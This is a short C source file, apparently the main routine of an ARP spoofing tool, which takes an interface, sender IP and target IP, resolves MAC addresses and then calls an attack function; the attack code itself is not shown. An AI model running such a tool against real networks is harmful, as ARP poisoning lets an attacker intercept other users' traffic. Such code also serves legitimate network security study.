#include "arp.h"


int main(int argc, char *argv[])
{
    /*
     * argv[1] : interface
     * argv[2] : sender IP
     * argv[3] : target IP
     */
    AddressInfo addressInfo;
    addressInfo.interface = argv[1];

    if(argc != 4)
    {
        usage();
        return 0;
    }

    // 1. Get Sender's MAC Address
    if (!GetSvrMacAddress(argv[1], addressInfo.hostMac))
    {
        printf("[-]Failed to get %s's MAC address..\n", argv[1]);
        return 0;
    }
    print_mac(argv[1], addressInfo.hostMac);

    // 2. Get Target's MAC Address
    addressInfo.senderIp = inet_addr(argv[2]);
    addressInfo.targetIp = inet_addr(argv[3]);
    if (!GetTargetMacAddress(&addressInfo))
    {
        printf("[-]Failed to get Sender's MAC address..\n");
        return 0;
    }
    print_mac(argv[3], addressInfo.senderMac);

    // 3. Shoot!
    attack(&addressInfo);
    printf("[+]Attack Success!!\n");


}
